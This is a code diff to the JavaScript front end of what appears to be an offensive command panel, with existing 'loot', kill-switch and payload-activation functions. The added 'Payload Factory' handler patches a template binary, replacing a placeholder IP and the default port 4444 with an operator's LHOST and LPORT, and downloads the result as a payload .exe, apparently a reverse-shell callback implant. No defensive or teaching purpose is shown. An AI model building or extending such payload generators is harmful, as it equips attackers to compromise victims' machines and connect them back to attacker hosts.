@@ -83,6 +83,9 @@ function setupEventListeners() {
     // New Listeners
     elements.killSwitch.addEventListener('click', triggerKillSwitch);
     elements.refreshLootBtn.addEventListener('click', loadLoot);
+
+    // Payload Factory Listener
+    document.getElementById('generatePayloadBtn').addEventListener('click', handlePayloadGeneration);
 }
 
 // GitHub API Functions
@@ -449,6 +452,59 @@ window.activatePayload = async function (attackName) {
         console.error(`FAILED: ${e.message}`); // Log error instead of alert
     }
 };
+
+async function handlePayloadGeneration() {
+    const fileInput = document.getElementById('templateFile');
+    const lhost = document.getElementById('lhost').value;
+    const lport = document.getElementById('lport').value;
+    const placeholder = document.getElementById('placeholderIp').value;
+    const btn = document.getElementById('generatePayloadBtn');
+
+    if (!fileInput.files.length) {
+        alert('Please select a Template Binary first.');
+        return;
+    }
+    if (!lhost || !lport) {
+        alert('Please enter LHOST and LPORT.');
+        return;
+    }
+
+    const file = fileInput.files[0];
+    btn.innerText = 'PATCHING...';
+    btn.disabled = true;
+
+    try {
+        const buffer = await file.arrayBuffer();
+
+        // Use the Patcher module
+        // We assume the template was made with LPORT 4444. If not, user should have specified, 
+        // but for now we hardcode the "Old Port" to search for as 4444 or let user specify?
+        // The plan didn't add an input for "Old Port", so we assume 4444.
+        const patchedBlob = Patcher.patch(buffer, placeholder, lhost, "4444", lport);
+
+        // Trigger Download
+        const url = window.URL.createObjectURL(patchedBlob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `payload_${lhost}_${lport}.exe`;
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+        document.body.removeChild(a);
+
+        btn.innerText = 'SUCCESS! DOWNLOAD STARTED';
+        setTimeout(() => {
+            btn.innerText = 'GENERATE_PAYLOAD';
+            btn.disabled = false;
+        }, 3000);
+
+    } catch (e) {
+        console.error(e);
+        alert('Patching Failed: ' + e.message);
+        btn.innerText = 'ERROR';
+        btn.disabled = false;
+    }
+}
 
 // Start
 init();
